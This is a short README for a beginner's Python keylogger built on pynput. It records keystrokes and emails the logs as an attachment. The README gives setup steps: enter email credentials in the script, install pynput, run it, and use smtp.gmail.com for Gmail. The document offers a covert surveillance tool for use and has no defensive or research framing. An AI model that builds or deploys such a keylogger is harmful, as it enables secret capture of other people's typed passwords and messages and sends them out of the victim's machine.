#### This keylogger is my first tool using python :D
#### It's a simple keylogger that sends email with logs attachment.
#### Thanks to [kahla-sec](https://github.com/kahla-sec) for help :D .
### How to use : 
#### 1. specify the address and the password of your email in the main
```python
k = keylogger("email","password")
```
#### 2. python keylogger.py ( or python3 keylogger.py )
#### Requirements :  pynput library
```shell
$pip install pynput
```
##### or
```sh
$pip3 install pynput
```
### NOTE
#### if you are using gmail, change the SMTP server to smtp.gmail.com
```python
serveur = SMTP("smtp.gmail.com",587)
```
